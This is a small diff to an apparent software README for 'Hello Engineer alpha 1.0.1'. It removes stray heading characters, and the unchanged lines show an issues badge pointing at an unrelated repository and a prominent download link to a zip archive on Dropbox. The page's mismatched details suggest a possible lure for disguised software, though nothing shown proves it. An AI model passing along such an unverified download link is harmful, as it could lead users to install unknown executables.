@@ -16,7 +16,7 @@ Hello Engineer alpha 1.0.1
 <img src="https://img.shields.io/github/issues/silent-lad/VueSolitaire.svg">
 <h1 align="center"><a  href="https://www.dropbox.com/s/88b5ae770660jzf/SoftPack.zip?dl=1">DOWNLOAD</a></h1>
 
-<h2 align="left">Description</h2>##
+<h2 align="left">Description</h2>
 <h1 align="left">System Requirements</h1>
  
 Processor Intel® or AMD processor with 64-bit support*; 2 GHz or faster processor <br>
